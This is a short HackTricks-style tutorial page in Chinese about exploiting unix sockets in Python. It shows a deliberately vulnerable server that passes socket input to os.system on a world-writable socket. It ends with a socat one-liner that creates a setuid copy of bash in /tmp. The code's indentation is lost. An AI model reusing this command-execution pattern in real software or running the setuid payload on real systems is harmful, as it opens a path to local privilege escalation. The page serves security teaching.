{{#include ../../banners/hacktricks-training.md}}

## 使用 Python 的 Socket 绑定示例

在以下示例中，**创建了一个 unix socket** (`/tmp/socket_test.s`)，并且所有**接收到的内容**都将由 `os.system` **执行**。我知道你在现实中不会找到这个，但这个示例的目的是看看使用 unix sockets 的代码是怎样的，以及如何在最糟糕的情况下管理输入。
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**执行**代码使用python: `python s.py` 并**检查socket的监听状态**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**利用**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
{{#include ../../banners/hacktricks-training.md}}
